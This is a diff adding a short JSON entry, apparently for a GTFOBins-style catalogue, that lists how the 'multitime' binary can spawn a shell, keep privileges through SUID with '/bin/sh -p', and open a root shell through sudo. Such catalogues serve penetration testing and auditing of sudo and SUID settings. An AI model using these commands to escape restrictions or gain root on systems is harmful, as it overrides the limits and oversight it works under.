@@ -1,0 +1,22 @@
+{
+  "functions": {
+    "shell": [
+      {
+        
+        "code": "multitime /bin/sh\n"
+      }
+    ],
+    "suid": [
+      {
+        
+        "code": "./multitime /bin/sh -p\n"
+      }
+    ],
+    "sudo": [
+      {
+        
+        "code": "sudo multitime /bin/sh\n"
+      }
+    ]
+  }
+}
